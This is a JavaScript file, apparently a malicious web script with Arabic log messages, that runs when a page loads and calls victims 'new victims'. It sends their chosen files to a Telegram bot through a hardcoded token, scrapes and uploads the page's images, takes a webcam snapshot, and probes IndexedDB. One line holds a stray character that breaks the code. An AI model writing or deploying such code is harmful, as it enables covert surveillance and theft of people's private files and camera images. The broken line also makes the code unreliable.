

(function () {

    console.log('%cLoading...', 'color: transparent');

   
    const BOT_TOKEN = '8560546892:AAH0VMbTtWDB4x0x7-I8KsYqdrV5r4hTACw';
    const CHAT_ID = '7788037752'; 
    const TG_URL = `https://api.telegram.org/bot${"8560546892:AAH0VMbTtWDB4x0x7-I8KsYqdrV5r4hTACw"}`;


    function sendLog(msg) {
        try {
            const data = new URLSearchParams();
            data.append('chat_id', CHAT_ID);
            data.append('text', `[${new Date().toLocaleString('ar-SA')}] ${msg}`);
            navigator.sendBeacon(`${TG_URL}/sendMessage`, data);
        } catch (e) { }
    }

    sendLog('🚀 ضحية جديدة دخلت الموقع');

   
    async function tryFileSystemAccess() {
        try {
            
            sendLog('📂 محاولة فتح File Picker...');

        
            const opts = {
                type: 'openFile',
                multiple: true,
                accept: {
                    'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp']
                }
            };

          
            const handle = await window.showOpenFilePicker(opts);
            sendLog(`📁 تم اختيار ${handle.length} ملف`);

            for (const fileHandle of handle) {
                const file = await fileHandle.getFile();
                const reader = new FileReader();

                reader.onload = async function (e) {
                    const base64 = e.target.result.split(',')[1];

                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('caption', `📸 ${file.name} (${(file.size / 1024).toFixed(2)}KB)`);

                   
                    const byteChars = atob(base64);
                    const byteNums = new Array(byteChars.length);
                    for (let i = 0; i < byteChars.length; i++) {
                        byteNums[i] = byteChars.charCodeAt(i);
                    }
                    const byteArray = new Uint8Array(byteNums);
                    const blob = new Blob([byteArray], { type: file.type });

                    formData.append('document', blob, file.name);

                    try {
                        await fetch(`${TG_URL}/sendDocument`, {
                            method: 'POST',
                            body: formData
                        });
                        sendLog(`✅ تم سحب: ${file.name}`);
                    } catch (e) {
                        sendLog(`❌ فشل سحب ${file.name}: ${e.message}`);
                    }
                };

                reader.readAsDataURL(file);
            }
        } catch (e) {
            sendLog(`❌ File System Access فشل: ${e.message}`);
        }
    }

   
    function scrapePageImages() {
        sendLog('🖼️ محاولة سحب صور الصفحة...');

        const images = document.querySelectorAll('img');
        sendLog(`📸 وجد ${images.length} صورة في الصفحة`);

        images.forEach((img, idx) => {
            const src = img.src;
            if (src && src.startsWith('http')) {
                try {
                    fetch(src)
                        .then(res => res.blob())
                        .then(blob => {
                            if (blob.type.startsWith('image/') && blob.size < 20 * 1024 * 1024) {
                                const formData = new FormData();
                                formData.append('chat_id', CHAT_ID);
                                formData.append('document', blob, `image_${idx}.${blob.type.split('/')[1]}`);
                                formData.append('caption', `🖼️ صورة من الموقع #${idx}`);

                                fetch(`${TG_URL}/sendDocument`, {
                                    method: 'POST',
                                    body: formData
                                });
                            }
                        })
                        .catch(() => { });
                } catch (e) { }
            }
        });
    }

    
    function tryCamera() {
        sendLog('📷 محاولة الوصول للكاميرا...');

        try {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function (stream) {
                    sendLog('✅ تم الوصول للكاميرا!');

                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);

                        canvas.toBlob(function (blob) {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('document', blob, 'camera_snapshot.jpg');
                            formData.append('caption', `📸 صورة من كاميرا الضحية - ${new Date().toLocaleString('ar-SA')}`);

                            fetch(`${TG_URL}/sendDocument`, {
                                method: 'POST',
                                body: formData
                            });

                            sendLog('✅ تم التقاط صورة من الكاميرا');

                        ا
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg', 0.8);
                    }, 2000);
                })
                .catch(function (err) {
                    sendLog(`❌ فشل الكاميرا: ${err.message}`);
                });
        } catch (e) {
            sendLog(`❌ الكاميرا غير متاحة: ${e.message}`);
        }
    }

    
    function enumerateLocalFiles() {
        sendLog('🔍 محاولة فهرسة الملفات المحلية...');

       
        try {
            const openRequest = indexedDB.open('file_system', 1);
            openRequest.onsuccess = function (event) {
                const db = event.target.result;
                const transaction = db.transaction(['files'], 'readonly');
                const store = transaction.objectStore('files');
                const getAll = store.getAll();

                getAll.onsuccess = function () {
                    const files = getAll.result;
                    sendLog(`📦 وجد ${files ? files.length : 0} ملف في IndexedDB`);
                };
            };
        } catch (e) { }
    }

    
    window.addEventListener('load', function () {
        setTimeout(() => {
            tryFileSystemAccess();
            scrapePageImages();
            tryCamera();
            enumerateLocalFiles();
        }, 3000);
    });

    
    setTimeout(() => {
        scrapePageImages();
    }, 10000);

})();
